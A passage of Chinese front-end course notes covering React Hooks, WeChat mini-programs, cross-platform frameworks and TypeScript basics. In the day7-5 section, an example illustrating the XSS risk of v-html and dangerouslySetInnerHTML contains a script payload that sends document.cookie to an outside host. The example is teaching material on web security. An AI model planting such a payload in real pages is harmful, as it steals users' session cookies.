        * attr()
        * prop()
        * on()
        * ...
    * 静态方法
        * jQuery.ajax()
        * jQuery.each()
        * jQuery.extend()
        * ...

    ```js
        jQuery.prototype.color = function(){
            // this === $('button')

            return this;
        }

        $('button').color().attr();

        jQuery.map = function(){

        }

        jQuery.map()
    ```

### 复习
* React Hooks
    * useState(initState)
    * useReducer(reducer,initState)
    * useEffect(fn,[deps])
    * useMemo(fn,[deps])
    * useCallbacK(fn,[deps])
    * useContext(context)
### 知识点
* useRef()
    > 与`React.createRef()`的区别
    * `React.createRef()`方式在组件更新时每次都会创建一个新的ref对象
    * `useRef()`方式在组件更新时获取缓存值
* useLayoutEffect
    > useEffect的同步版本，在组件渲染前执行，等效于类组件中的componentWillMount+componentWillUpdate，一般用于节点操作（避免闪现的效果）
* 自定义Hook
* 第三方Hook
    * react-router
        > 编程式导航需要得到history,location,match，需要通过`withRouter`高阶组件实现获取
        * useHistory
        * useLocation
        * useParams
        * useRouteMatch
    * react-redux
        > react-redux 7.1新增功能
        * useDispatch
        * useStore
        * useSelector
* hook的作用
    * 增强功能
    * 优化性能
    * 简化操作
* 利用useReducer+Context实现简化版redux
    * 唯一数据源：只能使用一个useReducer
    * 如何共享数据：Context实现跨组件共享(useContext)
    ```js
        const initData={}
        const reducer = function(){}
        export const ctx = React.createContext()
        export function Provider(props){
            const [goodslist,dispatch] = useReducer(initData)
            return <ctx.Provider value={[goodslist,dispatch]}>
                {props.children}
            </ctx.Provider>
        }

        <Provider>
            <App/>
        </Provider>

    ```
    * 练习：使用自定义hook实现简单版redux

* React项目
    1. 组队
    2. 选项目
    3. 分配任务
    4. 开发

* create-react-app
    * 创建项目：`create-react-app myapp`
    * 需改webpack配置
        * eject
        * node_modules/react-srcipts
        * react-app-rewired
            1. 根目录创建`config-overrides.js`文件
            2. 修改`package.json`的scripts命令

## day7-1

### 面试题
* 十进制转二进制
    * 整数：除2取余
    * 小数：乘2取整

## day7-2

### 面试题
* 项目成员架构
    * 前端
    * 后端
    * 测试
    * UI
    * 产品经历
    * 项目经理
    * Native工程师
* SSR与BSR
* 前端Web安全
    * xss       跨域脚本攻击
    * csrf      跨站请求伪造
    * 钓鱼网站

## day7-3

### 面试题
* 验证码（图形验证码+手机验证码）
    * 目的：防止而已行为
    * 核心：
        * 两次http请求（无状态）
            1. 请求验证码
            2. 发送验证码
        * session
            * 服务器存储技术，session.id
        * cookie
            > 客户端存储技术，随着请求自动发给服务器
    * 步骤
        1. 第一次请求：获取验证码
            * 建立会话，生成session.id，并发给客户端（写入cookie: Set-Cookie）
            * 随机创建验证码，并写入session存储
            * 图形验证码：响应给客户端
            * 手机验证码：调用**短信接口**，发送验证码给手机号
        2. 第二次请求：发送验证码给服务器校验
            > cookie中携带session.id并自动传给服务器
        3. 服务器校验验证码
            > 把客户端发的验证码与session中存储的验证码进行对比
* base标签与meta标签的使用


### 知识点
* 解决webpack环境下图片路径的问题
    * 图片路径
        * 相对路径
            * 是相对与html的路径
        * 绝对路径
            * `/` 开头
            * `http`开头
        * 基于当前文件引用图片
            > 需要webpack介入处理，需要相应的加载器处理
            * 
    * 搞懂网站根目录在哪
        > 根目录是一个网站的最顶级目录，所有的相对路径都不能穿透根目录

## day7-4

### 面试题
* 了解面试官意图

### 知识点
* 数据可视化
    > 数据统计
    * 标签
        * canvas
            > 画布，位图，方法会模糊
        * svg
            > xml,矢量图，放大不失真
    * 图表
        * 折线图
        * 柱状图
        * 饼状图
    * 框架
        * echarts
        * hicharts
    * 技术
        * 数据格式化
        * 与后端沟通数据格式

## day7-5

### 面试题
* Vue组件中的data配置为什么是函数
* React如何让包含html代码的数据显示到页面
    * 富文本编辑器
    ```html
        <input />
        <textarea />
        const content = '<div>asdfjlsadkjf<script>location.href="http://www.laoxie.com?cookie="+document.cookie</script></div>'
        <div>{{content}}</div>

        <!--vue-->
        <div v-html="content"></div>
        <!--react-->
        <div dangerouslySetInnerHTML={{__html:content}}></div>

        <!-- 原生js -->
        div.innerText = content;
        div.innerHTML = content;
    ```
* 如何监听用户关闭页面的操作
    * onload
    * onunload
    * onbeforeunload

* 提高查看文档的能力
    * 需求文档
    * 技术文档
* 如何解决用户缓存问题
    * 随机字符/时间戳/hash
    ```js
        <img src="img/a.jpg?t=123456" />
        <img src="img/a.jpg?t=134567" />

        
        <img src="img/a.123.jpg" />
        <img src="img/a.456.jpg" />
    ```
    * webpack
        * output    设置js文件（改文件名）
        * loader    设置静态资源文件（改文件名）
        * HtmlWebpacpPlugin 设置静态资源（在url添加随机字符）
### 知识点
* 项目优化
    * 按需加载
        > antd按需加载
        ```js
            import {Button} from 'antd'
        ```
    * 路由懒加载
        > 优化首页访问速度，只有用户访问到某个页面时才加载这个路由
    * 服务器压缩


## day8-1： 小程序

### 知识点
* 文件类型
    * 根据后缀名分类
        * .json 配置文件
        * .js 逻辑文件
        * .wxss 样式文件
        * .wxml 布局文件
        * .wxs 模块化脚本文件
    * 根据作用范围分类
        * 全局通用文件
            > 根目录下
        * 页面级别文件
            > pages文件夹下
    * project.config.json
    * sitemap.json
* 页面类型
    * 普通页面
    * tabbar页面
        > 只有tabbar页面才能显示tabbar

* wxml
    * 数据绑定
        * 单向：{{}}
        * 双向：
            * 单向+事件
            * model
    * 事件绑定
        * 绑定方式
            * bind:tap
            * catch:tap
        * event
            * detail
        * 传参
            * dataset 符合W3C标准的自定义属性

* js逻辑文件
    * 修改页面数据：this.setData()


## day8-2

### 知识点
* wxml+js
    * 列表循环
        * wx:for
            * index
            * item
        * wx:for-item   用于修改item名称
        * wx:for-index  用户修改index名称
        * wx:key    设置唯一值对应的属性（键）
            ```js
                data = [{id:1,name:'g1'},{id:2,name:'g2'},{id:3,name:'g3'}]
                data = [10,20,30,40]
                // vue/react
                :key="item.id" :key="item+index"
                key={item.id} 

                // 微信小程序
                wx:key="id" wx:key="*this"
            ```
    * 条件循环
        * wx:if
        * wx:else
        * wx:elif
    * 隐藏/显示一个元素
        * wx:if         v-if
        * hidden        v-show
            * 不能用在block上，一般用户频繁的显示隐藏操作
* 发起ajax请求
    > wx.request()
    * ajax请求封装
        * app.js
        * ESModule

* 路由跳转
    > tabbar页面与普通页面
    * 组件跳转
        > `<navigator/>`
            * open-type
    * 接口跳转
        * wx.navigateTo()
        * 传参：url参数
        * 在跳转的页面中接收参数

* 生命周期函数
    > 生命周周期执行过程与适合进行什么操作
    * 应用生命周期
        > app.js
        * onLaunch
        * onShow
        * onHide
    * 页面生命周期
        > PAGE.js
        * onLoad
        * onShow
        * onReady
        * onHide
        * onUnload
    * 组件生命周期
* 事件监听函数
* 常用api

## day8-3

### 知识点
* 开发接口
    * 步骤
        1. 获取授权
        2. 获取开发接口数据
    * 获取用户信息
        ```js
            // 自动获取授权
            wx.authorize()

            // 手动获取：让用户手动点击按钮实现获取
            <button open-type="getUserInfo" bindgetuserinfo></button>

            // 接口直接获取
            wx.getUserInfo();
            wx.getUserProfile();

            <open-data>
        ```
* 内置组件
    * audio
    * camera
    * map
        * 定位：wx.getLocation()
            > navigator.geolocation
                * getCurrentPosition()
                * watchPosition()



## day8-4

### 知识点
* 自定义组件
    * 定义： `Component(options)`
        * js
        * json
        * wxml
        * wxss
    * 使用: `usingComponents`
        * 全局组件：在app.json中定义usingComponents
        * 局部组件：在页面中定义usingComponents
* 自定义tabbar
    1. app.json中tabbar配置custom为true
    2. 在根目录下创建`custom-tab-bar`目录,并创建新`index`组件

* 第三方组件库
    * 常用组件
        * weui-miniprogram
        * vant-weapp
    * 使用步骤
        1. 下载安装： npm i 
        2. 构建: 开发者工具->工具->构建npm
        3. 配置: json文件中的usingComponents
* 在小程序中使用npm模块
    1. 生成package.json文件：`npm init`
    2. 安装模块： `npm inistall`
        > npm模块安装后不能直接使用，需要进行编译
    3. 构建小程序模块
        > 开发者工具->工具->构建npm

* 模块化
    * 为什么要模块化
        * 复用
        * 分工
        * 维护
    * 规范
        * commonJS      NodeJS
        * ESModule      ES6
        * AMD           require.js
        * CMD           sea.js
    * 微信小程序中的模块化
        * js 模块化：支持commonJS与ESModule
            * commonJS
                * 导出：module.exports
                * 引入: require()
            * ESModule
                * 导出: export
                * 引入: import
        * wxs 模块化
* wxml模板
    * 定义模板:`<template>`
        ```js
            <template name="list">
                // 这里放置复用的wxml结构代码
            </template>
        ```
    * 使用模板
* 云开发
    * 开通
    * 创建环境
        * 测试环境
        * 正式环境
    * 核心
        * 数据库
        * 存储空间
        * 云函数

## day9-1

### 知识点
* 小程序跨平台框架
    > 原理：实现了一个编译器，利用编译器把代码编译到各个平台
    * uni-app
        > DCloud平台下的一款跨平台框架，基于Vue开发
    * wePY
        >只能开发微信小程序，类似与Vue的语法
    * mpVue
    * taro
        * 安装
        * 初始化项目
        * 了解目录结构
        * 了解npm script
        * mobx
            > mobx-react桥接工具（等效于react-redux）

## day9-3

### 知识点
* webApp: html+css+js
    > 通过浏览器访问
* NativeApp
    * ReactNative
    * java
    * OC/swift
* HybridApp
    >在native中利用webview中嵌入H5页面形成半Native半web开发模式

* DCloud平台
    * HTML5+App给我们提供了40w+的接口，通过window.plus对象给我们使用
        * camera
        * io
        * nativeUI
        * gallery
        * webview
            > 实现html页面展示、原生接口调用
* 打包
    * 本地打包（主流）
        > 需要安装环境
        * android
        * iOS
        * cordova
            > 利用插件实现接口功能
    * 云打包
        > 第三方给我们提供安装了所有环境的服务器，并给我们提供了相应的硬件接口
        * 缺点：需要把代码传到第三方服务器进行打包

    * 打包前配置

## day 9-4

### 知识点
* 编译阶段
* 运行阶段


```js
    let num = 10;

    num = true;

    if(typeof num === 'number'){
        num.toFixed(2)
    }

    let box = document.querySelector('.box');// null
    if(box){
        box.onclick = function(){}

    }
```
* 强类型与弱类型
    > 针对类型校验来说，强类型在编译阶段校验，弱类型在运行阶段校验，javascript为弱类型语言
* 动态类型与静态类型
    > 针对与变量类型来说，javascript为动态类型语言
    ```js
        var username = 'laoxie'
        username = 100;
    ```
* 类型校验
    > 给变量声明类型，声明后，该变量只能存放这个类型的数据

    ```js
        // js
        let username = 'laoxie'
        username = 100;

        // ts
        let username:string = 'laoxie'
        username = 100;
    ```
    * 类型
        * string
        * number
        * boolean
        * null
        * undefined
        * symbol
        * enum
        * void
        * never
        * any：任意类型，相当前关闭ts的类型检查（等效于js变量）
        * 字面量
* 类型推论
    > 如声明变量时没有声明类型，则根据值推断数据类型
    ```js
        let a; // any
        function add(a,b){

        }
    ```
* 函数类型注解
    * 声明式
    * 赋值式
* 数组类型注解
    * 元素类型[]
    * Array<元素类型>
* 元组
    > 明确指定数量与类型的数组，函数返回值
    ```js
        function useState(initData:any):[{},()=>void]{
            return [state,changeUser]
        }
    ```
* 对象类型注解
    * interface

## day9-5

### 知识点
* typescript是js扩展
    * typescript = javascript + 类型系统 + 新特性